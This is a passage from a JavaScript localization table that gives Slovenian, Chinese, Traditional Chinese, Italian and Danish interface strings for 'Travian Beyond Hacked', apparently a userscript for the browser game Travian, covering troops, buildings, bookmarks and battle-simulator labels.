	'TAB14': 'Prikaži Info. Travian-search',
	'TAB15': 'Prikaži stopnje zgradb',
	'TAB16': 'Prikaži vsebino sporočil',
	'TAB17': 'Prikaži beležnico',
	'TAB18': 'Prikaži Info. Travmap',
	'TAB19': 'Zaznamki za Mestno hišo',
	'TAB20': 'Poenostavi listo bljižnjic na levi strani',
	'TAB21': 'Poenostavi seštevek pregled surovin vasi',
	'TAB22': 'Prestavi tabelo za pregled vasi',
	'TAB23': 'Napad:  Roparski pohod/Polni napad',
	'TAB24': 'Prestavi števec surovin',
	'TAB25': 'Prikaži skupno število enot v Zbirališču',
	'TAB26': 'Prikaži pregledno tabelo vasi',
	'TAB27': 'Slike zasebnega serverja: [ ]<br>Slike Travian serverja: [x]',
	'TAB28': 'Vpiši ID metropole (mpr: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Prikaži dodatne ikone',
	'TAB30': 'Prikaži Simulator Bitk [berichte]',
	'TAB31': 'Prikaži BBcode pomoč',
	'TAB32': 'Obarvaj stopnje surovinskih polj',
	'CLEAN': ' Počisti',
	'PAL': 'Palača',
	'RESI': 'Rezidenca',
	'MAN': 'Herojeva rezidenca',
	'USI': 'Izdelovalec oklepov',
	'ARM': 'Izdelovalec orožja',
	'HOT': 'Mestna hiša',
	'IGMTITLE': 'Predmet',
	'IGMSENTER': 'Pošiljatelj',
	'IGMDATE': 'Datum',
	'IGMTIME': 'čas',
	'IGMOUTPUT': 'Prikaži vsebino sporočil',
	'MAXTIME': 'Maksimalen čas',
	'LOGIN': 'Prijava',
	'TT': 'Pregled',
	'RESS': 'Surovine',
	'DEP': 'Skladišče',
	'PC': 'Kulturne Točke',
	'TROP': 'Enote',
	'MINI': 'Mini',
	'ATT': 'Napadi',
	'CONS': 'Stavba',
	'FT': 'Festival',
	'FT1': 'Majhen festival',
	'FT2': 'Gromozanski festival',
	'EXT': 'Razširitev',
	'IN': 'v',
	'JUGADOR': 'Igralec',
	'HAB': 'Populacija',
	'COORD': 'Koordinate',
	'ACCION': 'Možnosti',
	'MAPSCAN': 'Preglej mapo',
	'aid': 'Pomoč',
	'VITS': 'Hitrost',
	'CAPA': 'Kapaciteta',
	'DIST': 'Razdalja',
	'MP': 'Dodaj k zaznamkom',
	'UPDATE_CHECK': 'Preveri različico',
	'LAST_VERSION': 'Uporabljaš zadnjo verzijo',
	'NEW_VERSION': 'Na voljo je novejša verzija',
	'UPDATE_NOW': 'Nadgradi sedaj',
	'R1': 'Legionar', //Rimljani
	'R2': 'Praetorijan',
	'R3': 'Imperijan',
	'R4': 'Izvidnik',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Oblegovalni oven',
	'R8': 'Ognjeni katapult',
	'R9': 'Senator',
	'R10': 'Kolonist',
	'T1': 'Gorjačar', //Tevtoni
	'T2': 'Suličar',
	'T3': 'Metalec sekir',
	'T4': 'Skavt',
	'T5': 'Paladin',
	'T6': 'Tevtonski vitez',
	'T7': 'Oblegovalni oven',
	'T8': 'Mangonel',
	'T9': 'Vodja',
	'T10': 'Kolonist',
	'G1': 'Falanga', //Galci
	'G2': 'Mečevalec',
	'G3': 'Stezosledec',
	'G4': 'Theutatesova Strela',
	'G5': 'Druid',
	'G6': 'Haeduan',
	'G7': 'Oblegovalni oven',
	'G8': 'Trebušet',
	'G9': 'Poglavar',
	'G10': 'Kolonist',
	'N1': 'Podgana', //Narava
	'N2': 'Pajek',
	'N3': 'Kača',
	'N4': 'Netopir',
	'N5': 'Merjasec',
	'N6': 'Volk',
	'N7': 'Medved',
	'N8': 'Krokodil',
	'N9': 'Tiger',
	'N10': 'Slon',
	'LVL': 'stopnja',
	'MARC': 'Trgovcev',
	'TOTAL': 'Skupaj',
	'WASTED_SPACE' : 'Ostane',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Pomembno',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Besedila',
	'SAVEREPORT': 'Shrani Poročilo',
	'ANONYMIZE': 'Anonimno',
	'LBA0':'Velikost napada',
	'LBA2':'Skupen seštevek obrambe proti pehoti',
	'LBA3':'Skupen seštevek obrambe proti konjenici',
	'LBA4':'Splošna statistika',
	'LBA5':'Razlika v izgubah',
	'LBA6':'Poraba',
	'LBA7':'Izkušnje herojev',
	'LBA9':'Skupek izgub v žitu',
	'LBA10':'Poraba vojske v žitu',
	'LBA11':'Heroj ni bil',
	'LBA12':'Heroj',
	'LBA13':'Količina odnešenih surovin',
	'LBA14':'Maksimalna količina brez izgub',
	'LBA15':'Napadanje',
	'LBA16':'Branjenje',
	'BBC': 'BB koda:',
	'BBC_B': 'Krepko: [b]Besedilo[/b]',
	'BBC_I': 'Ležeče: [i]Besedilo[/i]',
	'BBC_U': 'Podčrtano: [u]Besedilo[/u]',
	'BBC_C': 'Na sredino: [c]Besedilo[/c]',
	'BBC_COLOR': 'Barve: [color=blue]Besedilo[/color] Namig: Lahko uporabljate tudi: color=#0000FF in #00F',
	'BBC_URL': 'Link: [url]http://url[/url] ali [url=http://url]Ime Linka[/url]'
	}
	break;
	case "cn":		// 由 Force Rock WONG 翻译
	var newLang = {
	'ALIANZA': '联盟',
	'SIM': '战斗模拟器',
	'SEGURO': '你确定?',
	'MARK': '全选',
	'PERDIDAS': '损失',
	'RENT': '收益率',
	'SUBIR_NIVEL': '可升级',
	'ALDEA': '村庄',
	'ATACAR': '攻击',
	'COMERCIAR': '运送资源',
	'GUARDADO': '已保存',
	'DESP_ABR': 'Mov.',
	'FALTA': '需要',
	'HOY': '今天',
	'MANYANA': '明天',
	'PAS_MANYANA': '后天',
	'MERCADO': '市场',
	'CUARTEL': '兵营',
	'PUNTO': '集结点',
	'CORRAL': '马厩',
	'TALLER': '工场',
	'ENVIAR': '运送资源',
	'COMPRAR': '买进',
	'VENDER': '卖出',
	'ENVIAR_IGM': '撰写消息',
	'LISTO': '升级可于',
	'EL': ' ',
	'A_LAS': '的',
	'EFICIENCIA': '运载率',
	'NUNCA': '无法满足',
	'PC': '文明度',
	'FUNDAR': '可以兴建或占领一座村庄',
	'TIEMPO': '时间',
	'STAT': 'Statistic',
	'OFREZCO': '提供',
	'BUSCO': '查找',
	'TIPO': '种类',
	'CUALQUIERA': '任意',
	'DISPONIBLE': '仅显示可用',
	'SI': '是',
	'NO': '否',
	'MARCADORES': '书签',
	'ANYADIR': '添加',
	'ENLACE': '新书签URL',
	'TEXTO': '新书签名',
	'ARCHIVE': '存档',
	'ELIMINAR': '删除',
	'ACTUALIZAR': '刷新',
	'REFRESH_INFORMARION': '刷新信息',
	'RESUMEN': '总览',
	'RECURSO1': '木材',
	'RECURSO2': '泥土',
	'RECURSO3': '铁块',
	'RECURSO4': '粮食',
	'ALDEA_EXTRA1': '出兵',
	'ALDEA_EXTRA2': '运送资源',
	'ALDEA_EXTRA3': '回中心地图',
	'ALDEA_EXTRA4': '村落概貌',
	'ALDEA_EXTRA5': '村庄中心',
	'ALDEA_EXTRA6': 'TSU中的信息',
	'ALDEA_EXTRA6B': 'Travian World Analyzer中的信息',
	'ALDEA_EXTRA7': 'Travian-search中的信息',
	'ALDEA_EXTRA8': '用Travmap定位',
	'ADD_ALL': '每种',
	'DEMO': '中心大楼',
	'FRIGO': 'Frigo',
	'TOOLS': '距离&时间',
	'TAB1': '对于 用Travmap定位 (红色), 将多个联盟之间用逗号分开.(例: A,B,C)',
	'TAB2': '编辑书签',
	'TAB3': '记事本内容',
	'TAB4': '市场售价',
	'TAB5': '显示 资源建筑表',
	'TAB6': '显示 中心建筑表',
	'TAB7': '显示 爆仓提示',
	'TAB8': '书签 行政',
	'TAB9': '书签 军事',
	'TAB10': '书签 增强',
	'TAB11': '书签 自定义',
	'TAB12': '显示 书签',
	'TAB13': '显示 TSU中的信息',
	'TAB13B': '显示 Travian World Analyzer中的信息',
	'TAB14': '显示 Travian-search中的信息',
	'TAB15': '显示 建筑等级',
	'TAB16': '显示 消息内容',
	'TAB17': '显示 记事本',
	'TAB18': '显示 用Travmap定位',
	'TAB19': '书签 市政厅',
	'TAB20': '简化左侧链接列表',
	'TAB21': '简化村庄总览',
	'TAB22': '村庄总览位置',
	'TAB23': '攻击:抢夺 / 攻击:普通',
	'TAB24': '爆仓提示位置',
	'TAB25': '显示 村庄中的军队总量 (集结点)',
	'TAB26': '显示 村庄总览表',
	'TAB27': '私服图片: [ ]<br> 官服图片: [x]',
	'TAB28': '填写首都/主村ID (例: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': '显示 扩展图标',
	'TAB30': '显示 战斗分析',
	'TAB31': '显示 BBcode帮助',
	'TAB32': '显示 资源建筑等级',
	'TAB33': '显示 NPC助手',
	'TAB34': '显示 快捷报告',
	'TAB35': '弹出信息中的单位速度(例 参议员: 4)',
	'CLEAN': '清除',
	'PAL': '皇宫',
	'RESI': '行宫',
	'MAN': '英雄园',
	'USI': '军械库',
	'ARM': '铁匠铺',
	'HOT': '市政厅',
	'IGMTITLE': '主题',
	'IGMSENTER': '发件人',
	'IGMDATE': '日期',
	'IGMTIME': '时间',
	'IGMOUTPUT': '显示所有消息内容',
	'MAXTIME': '最高需时',
	'LOGIN': '登录',
	'TT': '概况',
	'RESS': '资源',
	'DEP': '仓库',
	'PC': '文明度',
	'TROP': '军队',
	'MINI': '简化',
	'ATT': '攻击',
	'CONS': '建筑',
	'FT': '活动',
	'FT1': '小型活动',
	'FT2': '大型活动',
	'EXT': '扩张',
	'IN': 'in',
	'JUGADOR': '玩家',
	'HAB': '人口',
	'COORD': '坐标',
	'ACCION': '行动',
	'MAPSCAN': '扫描地图',
	'AID': '帮助',
	'VITS': '速度',
	'CAPA': '运载量',
	'DIST': '距离',
	'MP': '添加到书签',
	'UPDATE_CHECK': '检查更新',
	'LAST_VERSION': '正在使用最新版本',
	'NEW_VERSION': '新版本可用',
	'UPDATE_NOW': '现在升级',
	'R1': '古罗马步兵', // Romans
	'R2': '禁卫兵',
	'R3': '帝国兵',
	'R4': '使节骑士',
	'R5': '帝国骑士',
	'R6': '将军骑士',
	'R7': '冲撞车',
	'R8': '火焰投石器',
	'R9': '参议员',
	'R10': '拓荒者',
	'T1': '棍棒兵', // Teutons
	'T2': '矛兵',
	'T3': '斧头兵',
	'T4': '侦察兵',
	'T5': '圣骑士',
	'T6': '日尔曼骑兵',
	'T7': '冲撞车',
	'T8': '投石器',
	'T9': '执政官',
	'T10': '拓荒者',
	'G1': '方阵兵', // Gauls
	'G2': '剑士',
	'G3': '探路者',
	'G4': '雷法师',
	'G5': '德鲁伊骑兵',
	'G6': '海顿圣骑士',
	'G7': '冲撞车',
	'G8': '投石器',
	'G9': '首领',
	'G10': '拓荒者',
	'N1': '老鼠', // Nature
	'N2': '蜘蛛',
	'N3': '蛇',
	'N4': '蝙蝠',
	'N5': '野猪',
	'N6': '狼',
	'N7': '熊',
	'N8': '鳄鱼',
	'N9': '老虎',
	'N10': '大象',
	'LVL': '等级',
	'MARC': '商人',
	'TOTAL': '总量',
	'WASTED_SPACE' : '浪费空间',
	'TBH_SETUP_I': 'Travian Beyond Hacked: 主要功能',
	'TBH_SETUP_T': 'Travian Beyond Hacked: 文本',
	'SAVEREPORT': '保存报告',
	'ANONYMIZE': '匿名',
	'LBA0':'总攻击力',
	'LBA2':'对步兵总防御力',
	'LBA3':'对骑兵总防御力',
	'LBA4':'总体状况',
	'LBA5':'双方得失',
	'LBA6':'粮食消耗',
	'LBA7':'英雄经验',
	'LBA9':'总得失量',
	'LBA10':'军队的粮食消耗',
	'LBA11':'无英雄',
	'LBA12':'英雄',
	'LBA13':'抢走资源总量',
	'LBA14':'最大生存运载量',
	'LBA15':'攻击',
	'LBA16':'防御',
	'LBA17': '复制并转到战斗模拟器',
	'LBA18': '粘贴',
	'BBC': '可用的 BBcodes',
	'BBC_B': '粗体: [b]文本[/b]',
	'BBC_I': '斜体: [i]文本[/i]',
	'BBC_U': '下划线: [u]文本[/u]',
	'BBC_C': '居中: [c]文本[/c]',
	'BBC_COLOR': '颜色: [color=blue]文本[/color] 提示: 也可以使用: color=#0000FF 和 #00F',
	'BBC_URL': '链接: [url]http://url[/url] 或 [url=http://url]显示文本[/url]',
	'BBC_IMG': '图片: [img]URL[/img]',
	'THS0': '目前',
	'THS1': '升级',
	'THS2': '尚须'
	}
	break;
	case "tw": // translate by evildeepblue
	case "hk":
	var newLang = {
	'ALIANZA': '聯盟',
	'SIM': '戰鬥模擬器',
	'SEGURO': '你確定嗎?',
	'MARK': '全選',
	'PERDIDAS': '損失',
	'RENT': '獲利率',
	'SUBIR_NIVEL': '已經可以升級',
	'ALDEA': '村莊',
	'ATACAR': '攻擊',
	'COMERCIAR': '運送資源',
	'GUARDADO': '已儲存',
	'DESP_ABR': '移動',
	'FALTA': '需要',
	'HOY': '今天',
	'MANYANA': '明天',
	'PAS_MANYANA': '後天',
	'MERCADO': '市場',
	'CUARTEL': '兵營',
	'PUNTO': '集結點',
	'CORRAL': '馬癜',
	'TALLER': '工場',
	'ENVIAR': '運送資源',
	'COMPRAR': '買進',
	'VENDER': '賣出',
	'ENVIAR_IGM': '撰寫訊息',
	'LISTO': '升級可於',
	'EL': ' ',
	'A_LAS': '的',
	'EFICIENCIA': '運載率',
	'NUNCA': '無法滿足',
	'PC': '文明度',
	'FUNDAR': 'You can found or conquer a new village',
	'TIEMPO': '時間',
	'STAT': '統計',
	'OFREZCO': '提供',
	'BUSCO': '尋找',
	'TIPO': '種類',
	'CUALQUIERA': '任意',
	'DISPONIBLE': '僅顯示可用',
	'SI': '是',
	'NO': '否',
	'MARCADORES': '書籤',
	'ANYADIR': '新增',
	'ENLACE': '新書籤網址',
	'TEXTO': '新書籤名稱',
	'ARCHIVE': '存檔',
	'ELIMINAR': '刪除',
	'ACTUALIZAR': '更新',
	'REFRESH_INFORMARION': '更新訊息',
	'RESUMEN': '總覽',
	'RECURSO1': '木材',
	'RECURSO2': '泥土',
	'RECURSO3': '鐵塊',
	'RECURSO4': '糧食',
	'ALDEA_EXTRA1': '出兵',
	'ALDEA_EXTRA2': '運送資源',
	'ALDEA_EXTRA3': '回地圖中心',
	'ALDEA_EXTRA4': '村莊概況',
	'ALDEA_EXTRA5': '村莊中心',
	'ALDEA_EXTRA6': 'TSU人口成長訊息',
	'ALDEA_EXTRA6B': 'Travian World Analyzer人口成長訊息',
	'ALDEA_EXTRA7': 'Travian-search地圖位置搜尋',
	'ALDEA_EXTRA8': '使用Travmap定位',
	'ADD_ALL': '每種',
	'DEMO': '拆掉建築',
	'FRIGO': 'Frigo',
	'TOOLS': '距離與時間',
	'TAB1': '用Travmap定位(紅色)時，將多個聯盟間用逗號分開.(如: A,B,C)',
	'TAB2': '編輯書籤',
	'TAB3': '筆記本內容',
	'TAB4': '市場售價',
	'TAB5': '顯示資源建築表(0 或 1)',
	'TAB6': '顯示中心建築表(0 或 1)',
	'TAB7': '顯示爆倉提示(0 或 1)',
	'TAB8': '書籤行政(0 或 1)',
	'TAB9': '書籤軍事(0 或 1)',
	'TAB10': '書籤增強(0 或 1)',
	'TAB11': '書籤自定義(0 或 1)',
	'TAB12': '顯示書籤',
	'TAB13': '顯示TSU中的訊息(0 或 1)',
	'TAB13B': '顯示Travian World Analyzer中的訊息(0 或 1)',
	'TAB14': '顯示Travian-search中的訊息(0 或 1)',
	'TAB15': '顯示建築等級(0 或 1)',
	'TAB16': '顯示訊息內容(0 或 1)',
	'TAB17': '顯示筆記本(0 或 1)',
	'TAB18': '顯示用Travmap定位(0 或 1)',
	'TAB19': '書籤村莊大樓(0 or 1)',
	'TAB20': '簡化左側連結清單(0 or 1)',
	'TAB21': '簡化村莊總覽(0 or 1)',
	'TAB22': '村莊總覽位置(0 or 1)',
	'TAB23': '攻擊:搶奪/攻擊:普通(0 or 1)',
	'TAB24': '爆倉提示位置(0 or 1)',
	'TAB25': '顯示村莊中的軍隊總量(集結點) (0 or 1)',
	'TAB26': '顯示村莊總覽表(0 or 1)',
	'TAB27': '私服圖片: 0<br>官服圖片: 1',
	'CLEAN': '清除',
	'PAL': '皇宮',
	'RESI': '行宮',
	'MAN': '英雄館',
	'USI': '軍械庫',
	'ARM': '鐵匠',
	'HOT': '村莊大樓',
	'IGMTITLE': '主題',
	'IGMSENTER': '發件人',
	'IGMDATE': '日期',
	'IGMTIME': '時間',
	'IGMOUTPUT': '顯示所有訊息內容',
	'MAXTIME': '最高需時',
	'LOGIN': '登入',
	'TT': '概況',
	'RESS': '資源',
	'DEP': '倉庫',
	'PC': '文明度',
	'TROP': '軍隊',
	'MINI': '簡化',
	'ATT': '攻擊',
	'CONS': '建築',
	'FT': '活動',
	'FT1': '小型派對',
	'FT2': '大型派對',
	'EXT': '擴張',
	'IN': 'in',
	'JUGADOR': '玩家',
	'HAB': '人口',
	'COORD': '座標',
	'ACCION': '行動',
	'MAPSCAN': '掃描地圖',
	'AID': '說明',
	'VITS': '速度',
	'CAPA': '載運量',
	'DIST': '距離',
	'MP': '新增到書籤',
	'UPDATE_CHECK': '檢查更新',
	'LAST_VERSION': '正在使用最新版本',
	'NEW_VERSION': '新版本可用',
	'UPDATE_NOW': '現在升級',
	'R1': '古羅馬步兵', // 羅馬
	'R2': '禁衛兵',
	'R3': '帝國兵',
	'R4': '使節騎士',
	'R5': '帝國騎士',
	'R6': '將軍騎士',
	'R7': '衝撞車',
	'R8': '火焰投石器',
	'R9': '參議員',
	'R10': '拓荒者',
	'T1': '棍棒兵', // 條頓
	'T2': '矛兵',
	'T3': '斧頭兵',
	'T4': '偵察兵',
	'T5': '聖騎士',
	'T6': '日爾曼騎兵',
	'T7': '衝撞車',
	'T8': '投石器',
	'T9': '執政官',
	'T10': '拓荒者',
	'G1': '方陣兵', // 高盧
	'G2': '劍士',
	'G3': '探路者',
	'G4': '雷法師',
	'G5': '德魯伊騎兵',
	'G6': '海頓聖騎士',
	'G7': '衝撞車',
	'G8': '投石器',
	'G9': '首領',
	'G10': '拓荒者',
	'N1': '老鼠', // 自然界
	'N2': '蜘蛛',
	'N3': '蛇',
	'N4': '蝙蝠',
	'N5': '野豬',
	'N6': '狼',
	'N7': '熊',
	'N8': '鱷魚',
	'N9': '老虎',
	'N10': '大象',
	'LVL': '等級',
	'MARC': '商人'
	}
	break;
	case "it": // italian by Boris
	var newLang = {
	'ALIANZA': 'Alleanza',
	'SIM': 'Simulatore Combattimento',
	'SEGURO': 'Sei sicuro?',
	'MARK': 'Seleziona tutto',
	'PERDIDAS': 'Costi',
	'RENT': 'Ricavi',
	'SUBIR_NIVEL': 'Livello disponibile',
	'ALDEA': 'Villaggio',
	'ATACAR': 'Attacco',
	'COMERCIAR': 'Commercia risorse',
	'GUARDADO': 'Salvato',
	'DESP_ABR': 'Muovi',
	'FALTA': 'Manca',
	'HOY': 'oggi',
	'MANYANA': 'domani',
	'PAS_MANYANA': 'dopo domani',
	'MERCADO': 'Mercato',
	'CUARTEL': 'Fanteria',
	'PUNTO': 'Caserma',
	'CORRAL': 'Scuderia',
	'TALLER': 'Officina',
	'ENVIAR': 'Mercato',
	'COMPRAR': 'Compra',
	'VENDER': 'Vendi',
	'ENVIAR_IGM': 'Invia Messaggio',
	'LISTO': 'Pronto',
	'EL': 'il',
	'A_LAS': 'alle',
	'EFICIENCIA': 'Efficienza',
	'NUNCA': 'Mai',
	'PC': 'Punti cultura',
	'FUNDAR': 'Puoi fondare o conquistare un nuovo villaggio',
	'TIEMPO': 'Tempo',
	'STAT': 'Statistiche',
	'OFREZCO': 'Offerta',
	'BUSCO': 'Ricerca',
	'TIPO': 'Tipo',
	'CUALQUIERA': 'Tutti',
	'DISPONIBLE': 'Disponibili',
	'SI': 'Si',
	'NO': 'No',
	'MARCADORES': 'Links',
	'ANYADIR': 'Aggiungi',
	'ENLACE': 'URL del nuovo link',
	'TEXTO': 'Testo del nuovo link',
	'ARCHIVE': 'Archivio',
	'ELIMINAR': 'Elimina',
	'ACTUALIZAR': 'Aggiorna',
	'REFRESH_INFORMARION': 'Aggiorna Dati',
	'RESUMEN': 'Sommario',
	'RECURSO1': 'Legno',
	'RECURSO2': 'Argilla',
	'RECURSO3': 'Ferro',
	'RECURSO4': 'Grano',
	'ALDEA_EXTRA1': 'Invia Truppe',
	'ALDEA_EXTRA2': 'Invia Risorse',
	'ALDEA_EXTRA3': 'Centra sulla mappa',
	'ALDEA_EXTRA4': 'Vista globale del villaggio',
	'ALDEA_EXTRA5': 'Centro del villaggio',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Localizza su Travmap',
	'ADD_ALL': 'Per tutti ',
	'DEMO': 'Démolisci Costruzione',
	'FRIGO': 'Frigo',
	'TOOLS': 'Distanze e Tempi',
	'TAB1': 'Per localizzare su Travian-map (in rosso) puoi separare multiple alleanze con la virgola (ex: A,B,C)',
	'TAB2': 'Edita links',
	'TAB3': 'Blocco Note',
	'TAB4': 'Prezzo di vendita al mercato',
	'TAB5': 'Tabella risorse (0 o 1)',
	'TAB6': 'Tabella costruzioni (0 o 1)',
	'TAB7': 'Visualizza contatori deposito(0 o 1)',
	'TAB8': 'Visualizza links Palazzi (0 o 1)',
	'TAB9': 'Visualizza links Esercito (0 o 1)',
	'TAB10': 'Visualizza links Ampliamento (0 o 1)',
	'TAB11': 'Visualizza links Personali (0 ou 1)',
	'TAB12': 'Visualizza links',
	'TAB13': 'Visualizza Info TSU (0 o 1)',
	'TAB13B': 'Visualizza Info Travian World Analyzer (0 o 1)',
	'TAB14': 'Visualizza Info Travian-search (0 o 1)',
	'TAB15': 'Visualizza N° su costruzioni (0 o 1)',
	'TAB16': 'Visualizza il contenuto dei messaggi (0 o 1)',
	'TAB17': 'Visualizza il blocco note (0 o 1)',
	'TAB18': 'Visualizza Info Travmap (0 o 1)',
	'TAB19': 'Visualizza link Municipio (0 o 1)',
	'TAB20': 'Semplificare la lista dei links a sinistra (0 o 1)',
	'TAB21': 'Semplificare il sommario dei villaggi (0 o 1)',
	'TAB22': 'Riposizionare il sommario dei villaggi (0 ou 1)',
	'TAB23': 'Attacco: Raid / Attacco: Normale (0 o 1)',
	'TAB24': 'Riposizionare il contatore del deposito(0 o 1)',
	'TAB25': 'Visualizza totale truppe in caserma (0 o 1)',
	'TAB26': 'Visualizza sommario villaggio (0 o 1)',
	'TAB27': 'Server immagini personale : 0<br>Server immagini di Travian: 1',
	'CLEAN': ' Pulisci',
	'PAL': 'Castello',
	'RESI': 'Palazzo',
	'MAN': 'Circolo degli Eroi',
	'USI': 'Armeria',
	'ARM': 'Fabbro',
	'HOT': 'Municipio',
	'IGMTITLE': 'Oggetto',
	'IGMSENTER': 'Mittente',
	'IGMDATE': 'Data',
	'IGMTIME': 'Ora',
	'IGMOUTPUT': 'Visualizza il contenuto dei messaggi',
	'MAXTIME': 'Tempo massimo',
	'LOGIN': 'Accesso',
	'TT': 'Vista globale',
	'RESS': 'Risorse',
	'DEP': 'Depositi',
	'PC': 'Punti Cultura',
	'TROP': 'Truppe',
	'MINI': 'Ridotto',
	'ATT': 'Attacchi',
	'CONS': 'Costruzioni',
	'FT': 'Feste',
	'FT1': 'Piccola festa',
	'FT2': 'Grande Festa',
	'EXT': 'Ampliamento',
	'IN': 'in',
	'JUGADOR': 'Giocatore',
	'HAB': 'Popolazione',
	'COORD': 'Coordinate',
	'ACCION': 'Azioni',
	'MAPSCAN': 'Visualizza Risorse',
	'AID': 'Aiuto',
	'VITS': 'Velocità',
	'CAPA': 'Capacità',
	'DIST': 'Distanza',
	'MP': 'Imposta link ',
	'UPDATE_CHECK': 'Verifica versione',
	'LAST_VERSION': 'Avete la ultima versione disponibile',
	'NEW_VERSION': 'Una nuova versione è disponibile',
	'UPDATE_NOW': 'Aggiorna ora',
	'R1': 'Legionari', //romain
	'R2': 'Prétoriani',
	'R3': 'Impériani',
	'R4': 'Legionari a cavallo',
	'R5': 'Imperiani a cavallo',
	'R6': 'Cavallerie Romana',
	'R7': 'Arieti da sfondamento',
	'R8': 'Catapulte',
	'R9': 'Senatori',
	'R10': 'Decurioni',
	'T1': 'Combattenti', //teuton
	'T2': 'Lancieri',
	'T3': 'Combattenti con ascia',
	'T4': 'Esploratori',
	'T5': 'Paladini',
	'T6': 'Cavallerie Teutoni',
	'T7': 'Arieti',
	'T8': 'Catapulte',
	'T9': 'Comandanti',
	'T10': 'Decurioni',
	'G1': 'Lancieri', //gaulois
	'G2': 'Combattenti con spada',
	'G3': 'Esploratori',
	'G4': 'Cavallerie Galliche',
	'G5': 'Cavallerie di Difesa',
	'G6': 'Cavallerie Avanzate',
	'G7': 'Arieti',
	'G8': 'Catapulte',
	'G9': 'Capi Tribù',
	'G10': 'Decurioni',
	'N1': 'Topi', //nature
	'N2': 'Ragni',
	'N3': 'Serpenti',
	'N4': 'Pipistrelli',
	'N5': 'Cinghiali',
	'N6': 'Lupi',
	'N7': 'Orsi',
	'N8': 'Coccodrilli',
	'N9': 'Tigri',
	'N10': 'Elefanti',
	'LVL': 'livello',		//tres important
	'MARC': 'Mercanti',		//tres important
	'TEST': 'test'			//pour les tests
	}
	break;
	case 'dk':
	var newLang = {
	'ALIANZA': 'Alliance',
	'SIM': 'Kampsimulator',
	'SEGURO': 'Er du sikker?',
	'MARK': 'Vælg alle',
	'PERDIDAS': 'Tab',
	'RENT': 'Overskud',
	'SUBIR_NIVEL': 'Udvidelse til rådighed',
	'ALDEA': 'Village Name',
	'ATACAR': 'Angrib',
	'COMERCIAR': 'Send ressourcer',
	'GUARDADO': 'Gemt',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Du mangler',
	'HOY': 'I dag',
	'MANYANA': 'I morgen',
	'PAS_MANYANA': 'i over morgen',
	'MERCADO': 'Markedsplads',
	'CUARTEL': 'Kaserne',
	'PUNTO': 'Forsamlingsplads',
	'CORRAL': 'Stald',
	'TALLER': 'Værksted',
	'ENVIAR': 'Send ressourcer',
	'COMPRAR': 'Køb',
	'VENDER': 'Sælg',
	'ENVIAR_IGM': 'Send IGM',
	'LISTO': 'Klar',
	'EL': 'on',
	'A_LAS': 'at',
	'EFICIENCIA': 'Effektivitet',
	'NUNCA': 'Aldrig',
	'PC': 'kultur points',
	'FUNDAR': 'Du kan grundlægge eller overtage en ny by',
	'TIEMPO': 'Tid',
	'STAT': 'Statistik',
	'OFREZCO': 'Tilbyder',
	'BUSCO': 'Søger',
	'TIPO': 'Type',
	'CUALQUIERA': 'Enhver',
	'DISPONIBLE': 'Kun til rådighed',
	'SI': 'Ja',
	'NO': 'Nej',
	'MARCADORES': 'Bogmærker',
	'ANYADIR': 'Tilføj',
	'ENLACE': 'Ny Bogmærker URL',
	'TEXTO': 'Ny Bogmærker Text',
	'ARCHIVE': 'Archive',
	'ELIMINAR': 'Fjern',
	'ACTUALIZAR': 'Opdater',
	'REFRESH_INFORMARION': 'Opdater Info',
	'RESUMEN': 'Oversigt',
	'RECURSO1': 'Træ',
	'RECURSO2': 'Ler',
	'RECURSO3': 'Jern',
	'RECURSO4': 'Korn',
	'ALDEA_EXTRA1': 'Send soldater',
	'ALDEA_EXTRA2': 'Send råstoffer',
	'ALDEA_EXTRA3': 'centrering på kortet',
	'ALDEA_EXTRA4': 'Vis Global på landsby',
	'ALDEA_EXTRA5': 'centrering om landsby',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Placering på Travmap',
	'ADD_ALL': 'for alle ',
	'DEMO': 'Hovedbygning',
	'FRIGO': 'Frigo',
	'TOOLS': 'afstand og tid',
	'TAB1': 'For placering på Travmap (rød), din Adskil flere alliancer med et komma. (Ex: A, B, C)',
	'TAB2': 'Rediger sine bogmærker',
	'TAB3': 'Notepad',
	'TAB4': 'Price Sales Market',
	'TAB5': 'Info tabellen: (0 eller 1)',
	'TAB6': 'Info tabellen bygninger (0 eller 1)',
	'TAB7': 'Visning meter depositum (0 eller 1)',
	'TAB8': 'Bogmærker build.admin (0 eller 1)',
	'TAB9': 'Bogmærker build.military (0 eller 1)',
	'TAB10': 'Bogmærker build.for forbedring (0 eller 1)',
	'TAB11': 'Bogmærker Custom (0 eller 1)',
	'TAB12': 'Vis bogmærker',
	'TAB13': 'Vis Info TSU (0 eller 1)',
	'TAB13B': 'Vis Info Travian World Analyzer (0 eller 1)',
	'TAB14': 'Vis Info Travian-search (0 eller 1)',
	'TAB15': 'Vis N ° på bygningen (0 eller 1)',
	'TAB16': 'Vis indholdet af meddelelser (0 eller 1)',
	'TAB17': 'Vis notesblok af budskaber (0 eller 1)',
	'TAB18': 'Show Info Travmap (0 or 1)',
	'TAB19': 'Bogmærker opbygge. Town Hall (0 eller 1)',
	'TAB20': 'Forenkling af den liste med links til venstre (0 eller 1)',
	'TAB21': 'Forenkling af resumé af landsbyer (0 eller 1)',
	'TAB22': 'repositionere resuméet af landsbyer (0 eller 1)',
	'TAB23': 'Angreb: Raid / Angreb: Normal (0 eller 1)',
	'TAB24': 'repositionere af måleraflæsning depositum (0 eller 1)',
	'TAB25': 'Vis samlede antal tropper i landsbyen (Rallypoint) (0 eller 1)',
	'TAB26': 'Vis oversigt landsby tabellen (0 eller 1)',
	'TAB27': 'Image server private : 0<br>Image server travian : 1',
	'CLEAN': ' Clean',
	'PAL': 'Palads',
	'RESI': 'Residens',
	'MAN': 'Heltegården',
	'USI': 'Rustningssmedje',
	'ARM': 'våbensmedje',
	'HOT': 'rådhus',
	'IGMTITLE': 'Emne',
	'IGMSENTER': 'afsteder',
	'IGMDATE': 'dag',
	'IGMTIME': 'tid',
